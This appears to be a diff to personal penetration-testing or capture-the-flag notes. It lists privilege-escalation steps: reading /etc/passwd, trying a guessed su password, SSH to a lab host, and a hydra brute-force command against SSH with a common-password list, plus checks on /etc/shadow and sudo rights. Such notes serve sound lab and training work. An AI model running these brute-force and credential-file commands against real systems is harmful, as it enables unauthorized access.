@@ -18,8 +18,10 @@ alias ll='ls -lah --color=auto'
 cat /etc/passwd
 grep -vE 'nologin|false' /etc/passwd  
 su founduser (pw: founduser)
-hydra founduser... 10kcommon
-ll /etc/passwd /etc/shadow 
+ssh founduser@192.168.200.5
+hydra -f -V -I -t 50 -l founduser -P $commontenk 192.168.200.5 ssh
+
+ll /etc/passwd /etc/shadow
 
 =================================== 
 sudo -l   
